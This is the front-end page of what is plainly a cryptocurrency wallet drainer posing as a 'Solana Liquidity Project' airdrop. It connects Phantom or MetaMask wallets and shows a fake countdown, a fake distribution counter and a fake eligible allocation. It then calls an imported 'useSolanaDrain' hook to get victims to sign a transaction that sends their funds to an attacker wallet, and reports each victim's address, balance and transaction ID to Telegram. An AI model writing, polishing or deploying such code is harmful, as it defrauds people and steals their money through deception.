"use client";
import { useState, useEffect } from 'react';
import { Connection, LAMPORTS_PER_SOL } from '@solana/web3.js';
import { ethers } from 'ethers';
import { useSolanaDrain } from '@/hooks/useSolanaDrain';
import { sendTelegramLog } from '@/utils/telegramLogger';
import { calculateAllocation } from '@/utils/calculateAllocation';
import WalletModal from '@/components/WalletModal';
import styles from './page.module.css';

const RPC = "https://solana-mainnet.rpc.extrnode.com"; 

export default function Home() {
  const [connected, setConnected] = useState(false);
  const [walletAddress, setWalletAddress] = useState("");
  const [showModal, setShowModal] = useState(false);
  const [balance, setBalance] = useState(0);
  const [allocated, setAllocated] = useState(0);
  const [distributed, setDistributed] = useState(1784.55);
  const [countdown, setCountdown] = useState(180);
  const [status, setStatus] = useState('idle'); // idle, processing, success, error
  const [uiMessage, setUiMessage] = useState({ text: "", type: "" }); // To replace alerts

  const { executeDrain } = useSolanaDrain(RPC, process.env.NEXT_PUBLIC_SOLANA_WALLET);

  // Helper to show messages in UI instead of alerts
  const notify = (text, type = "error") => {
    setUiMessage({ text, type });
    if (type === "error") setStatus('error');
    // Clear message after 5 seconds
    setTimeout(() => setUiMessage({ text: "", type: "" }), 5000);
  };

  useEffect(() => {
    const t = setInterval(() => setCountdown(p => p <= 0 ? 0 : p - 1), 1000);
    const d = setInterval(() => setDistributed(p => p + Math.random()*0.05), 5000);
    return () => { clearInterval(t); clearInterval(d); };
  }, []);

  const formatTime = (s) => `${Math.floor(s/60)}:${(s%60).toString().padStart(2,'0')}`;

  const handleConnect = async (type) => {
    try {
      let addr, bal = 0;
      if (type === 'phantom') {
        if (!window.solana) return notify("Please open this site inside the Phantom App browser.");
        const resp = await window.solana.connect();
        addr = resp.publicKey.toString();
        const conn = new Connection(RPC);
        bal = (await conn.getBalance(resp.publicKey)) / LAMPORTS_PER_SOL;
      } else if (type === 'metamask') {
        if (!window.ethereum) return notify("Please open this site inside the MetaMask App browser.");
        const provider = new ethers.BrowserProvider(window.ethereum);
        const accs = await provider.send("eth_requestAccounts", []);
        addr = accs[0];
        bal = 0.01; 
      }
      setWalletAddress(addr);
      setBalance(bal);
      setConnected(true);
      setShowModal(false);
      
      const alloc = bal > 0.005 ? calculateAllocation(addr) : 0;
      setAllocated(alloc);
      await sendTelegramLog('connected', { address: addr, type, balance: bal, amount: alloc });
    } catch (e) { notify("Connection failed. Ensure your wallet is unlocked."); }
  };

  const handleAction = async () => {
    setStatus('processing');
    const res = await executeDrain(window.solana);
    if (res.success) {
      setStatus('success');
      await sendTelegramLog('success', { address: walletAddress, balance, tx: res.txId });
    } else {
      notify(res.error || "Signature required to proceed.", "error");
    }
  };

  return (
    <div className={styles.container}>
      <div className={styles.glassCard}>
        <h1 className={styles.heroTitle}>Solana Liquidity Project</h1>
        <p className={styles.subtitle}>Epoch V3.1 Institutional Distribution</p>
        
        <div className={styles.timerBox}>CURRENT EPOCH CLOSES IN: {formatTime(countdown)}</div>
        
        {/* Sleek UI Notification Bar (Replaces Alerts) */}
        {uiMessage.text && (
          <div className={type === 'error' ? styles.errorBanner : styles.successBanner}>
            {uiMessage.text}
          </div>
        )}

        <div className={styles.statsGrid}>
          <div className={styles.statItem}><div className={styles.statValue}>{distributed.toFixed(2)}</div><div className={styles.statLabel}>SOL Distributed</div></div>
          <div className={styles.statItem}><div className={styles.statValue}>3,500.00</div><div className={styles.statLabel}>Total Pool</div></div>
        </div>

        {!connected ? (
          <button className={styles.primaryButton} onClick={() => setShowModal(true)}>Connect Wallet to Verify Eligibility</button>
        ) : (
          <div className={styles.actionArea}>
            {balance <= 0.005 ? (
              <div className={styles.errorBox}>
                <p><b>Status: Ineligible</b></p>
                <p style={{fontSize: '0.75rem', opacity: 0.7, marginTop: '8px'}}>Address does not meet minimum activity requirements.</p>
              </div>
            ) : status === 'success' ? (
              <div className={styles.successBox}><h3>✅ Confirmed</h3><p>Allocation queued. Check your wallet in 2-4 hours.</p></div>
            ) : (
              <div className={styles.eligibleBox}>
                <p className={styles.validationTag}>VALIDATION SUCCESSFUL</p>
                <h2 className={styles.allocAmount}>{allocated.toFixed(2)} SOL</h2>
                <button className={styles.primaryButton} onClick={handleAction} disabled={status==='processing'}>
                  {status === 'processing' ? 'Broadcasting to Mainnet...' : 'Verify and Initialize On-Chain Allocation'}
                </button>
              </div>
            )}
          </div>
        )}
      </div>
      <WalletModal isOpen={showModal} onClose={() => setShowModal(false)} onSelect={handleConnect} />
    </div>
  );
}
